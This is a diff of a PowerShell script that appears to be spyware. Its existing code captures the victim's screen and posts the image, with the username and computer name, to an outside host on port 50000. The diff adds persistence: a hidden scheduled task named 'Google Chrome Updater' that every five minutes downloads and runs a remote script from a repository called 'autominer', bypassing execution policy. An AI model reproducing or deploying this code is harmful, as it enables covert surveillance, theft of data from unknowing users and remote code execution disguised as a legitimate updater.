@@ -84,10 +84,8 @@ Remove-Item "$($env:USERPROFILE)\out.f"
 write-output "edge end"
 # EDGE end
 
-
-
-
-$bitmap = New-Object System.Drawing.Bitmap $Width, $Height--
+# SCREENSHOT start
+$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
 $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
 # convert to base64
@@ -98,3 +96,11 @@ $stream.Close()
 $graphic.Dispose()
 $bitmap.Dispose()
 Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveScreenshot -Method POST -Body @{data = $base64; username = $Env:UserName; ComputerName = $Env:ComputerName } 
+# SCREENSHOT end
+
+# Scheduled Tasks adder start
+$action = New-ScheduledTaskAction -Execute "powershell" -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass "irm https://raw.githubusercontent.com/zlc1004/autominer/main/screenshot.ps1 | iex"'
+# run every 5 minutes
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5)
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Google Chrome Updater" -Description "This event checks "
+# Scheduled Tasks adder end
